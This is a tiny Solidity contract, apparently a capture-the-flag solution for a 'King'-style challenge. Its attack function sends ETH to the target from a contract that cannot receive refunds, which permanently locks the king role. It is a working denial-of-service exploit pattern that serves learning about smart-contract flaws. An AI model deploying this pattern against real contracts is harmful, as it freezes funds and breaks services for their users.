// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {
    function attack(address payable _king) external payable {
        (bool ok, ) = _king.call{value: msg.value}("");
        require(ok, "failed to call");
    }
}